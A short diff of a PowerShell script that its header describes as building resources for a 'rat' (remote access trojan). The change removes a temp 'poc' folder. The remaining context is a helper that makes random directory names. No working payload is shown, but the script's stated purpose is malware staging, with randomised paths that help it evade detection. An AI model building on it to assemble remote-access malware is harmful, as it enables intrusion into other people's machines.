@@ -1,9 +1,6 @@
 # builds resources for rat
 # created by : jfrdgh (@bigmanlc on dc)
 
-$pocpath = "$env:TEMP/poc"
-mkdir $pocpath
-
 # random string for directories
 function random_text {
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | %  {[char]$_})
